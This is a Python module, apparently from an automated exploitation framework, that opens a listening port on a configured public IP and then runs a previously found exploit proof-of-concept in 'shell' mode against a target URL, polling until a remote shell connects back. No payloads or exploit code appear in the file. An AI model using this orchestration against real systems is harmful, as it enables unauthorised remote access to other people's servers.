#!/usr/bin/env python
# -*- coding: utf-8 -*-
from copy import Error
from random import randint
from Framework.Valueconfig import ValueStatus, FOLDER_FRAMEWORK_ROOT
import os
from datetime import date
import re
from sys import path
from urllib.parse import urlsplit
import hashlib
import os, time, binascii

from subprocess import Popen, PIPE, STDOUT

from Framework.Library.Module import Module
from Framework.Library.Output.OutputShell.output import ModuleOutput
from Framework.Library.Output.OutputShell.input import ModuleInput
from Framework.Library.Function.openport import OpenPort
from Framework.Library.Function.Function.POC import POC

class ModuleFramework(Module):
    name = "OutputShell"
    type_module = "Module_Output"
    path_input_class = "/input.py"
    path_output_class = "/output.py"
    ans = []
    url = ''
    filename = 'output_shell.py'
    path_log = ""
    input_module = None
    config_module = None
    status = ''
    result_of_other_tool = {}


    def __init__(self):
        self.status = ValueStatus.Creating
    def info(self):
        result = {}
        result['name'] = self.name
        result['typemodule'] = self.type_module
        result['type'] = "offline"
        result['version'] = "1.0"
        return result
    def stop(self):
        self.status = ValueStatus.Stopping
       
    def start(self):
        # run 
        self.output_module = ModuleOutput()
        
        self.status = ValueStatus.Running
        try:
            self.Cf_Server_OpenPort = self.config_module['Cf_Server_OpenPort']
            Cf_PublicIP = self.config_module['Cf_PublicIP']
            self.Cf_PublicPort  = self.config_module['Cf_PublicPort']
            if (self.Cf_PublicPort == "Auto"):
                self.config_module['Cf_PublicPort'] = randint(30000,40000);
                self.Cf_PublicPort = self.config_module['Cf_PublicPort']
            self.output_module.make_config_connect(server_rev = self.Cf_Server_OpenPort, port_rev=self.Cf_PublicPort, ip_rev=Cf_PublicIP)
            module_poc = self.input_module.to_json()['EXPLOIT_POCS'][0]['app_name']
            URL_target = self.input_module.to_json()['EXPLOIT_POCS'][0]['result']['ShellInfo']['url'][0]
            self.target_connect = URL_target
            objectPort = OpenPort(self.Cf_Server_OpenPort)
            objectPort.openport(self.Cf_PublicPort)
            status_connect = objectPort.run_check()
            objectPOC = POC()
            objectPOC.MODE = "shell"
            objectPOC.set_input(self.input_module)
            objectPOC.set_config(self.config_module)
            objectPOC.PoCs_Select = [module_poc]
            objectPOC.run()
            value = 0
            while True:
                if self.status == ValueStatus.Stopping:
                    raise Exception("Stop from user")
                value += 1
                status = objectPOC.get_status()
                status_connect = status_connect== ValueStatus.Success if status_connect else objectPort.check_connect()
                if (status == ValueStatus.Success and status_connect==ValueStatus.Success )or status == ValueStatus.Error:
                    break
                if value % 5 == 0:
                    if value == 10:
                        raise Exception("Fail connect")
                    objectPort.run_check()
                time.sleep(2.5)
            resultScan = objectPOC.result()[0]['result']['ShellInfo']

            self.output_module.update_status(URL_target, resultScan['Status'], self.Cf_PublicPort)
            self.status = ValueStatus.Success
        except Exception as e:
            print("Exception: ", self.name, e)
            self.status = ValueStatus.Error
            self.output_module.update_status(URL_target, ValueStatus.Error)
        
        if (self.status == ValueStatus.Error):
            objectPort.closePort()
    def get_status(self):
        return self.status
    def set_input_module(self, input):
        
        try:
            self.input_module = ModuleInput()
            list_data = input['Module_Exploit']
            if not isinstance(list_data, list):
                list_data = [list_data]

            for data in list_data:
                temp_module = ModuleInput()
                temp_module.try_parse(data)
                self.input_module.extend(temp_module)
        except Exception as e:
            print("Error get input for PocCheck", e)
    def get_output_module(self):
        return self.output_module




if __name__ == "__main__": 
      
    pass